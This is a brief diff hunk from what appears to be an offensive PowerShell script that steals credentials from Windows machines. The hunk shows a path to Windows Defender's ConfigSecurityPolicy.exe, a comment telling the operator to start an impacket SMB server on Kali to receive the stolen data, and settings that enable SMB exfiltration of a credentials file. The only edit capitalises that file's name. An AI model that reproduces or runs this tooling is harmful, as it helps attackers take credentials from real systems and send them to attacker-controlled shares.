@@ -51,7 +51,7 @@ $ConfigSecurityPolicy = "C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe"
 # start smb server in kali: impacket-smbserver -smb2support exfilShare ${PWD}
 $enableSmbExfil = $true
 $shareName = "Exploitation" # must match share in impacket-smbserver (i.e., exfilShare)
-$outputFile = "credentials.txt" # filename of exfiltrated credentials
+$outputFile = "Credentials.txt" # filename of exfiltrated credentials
 
 ##########################################################################
 
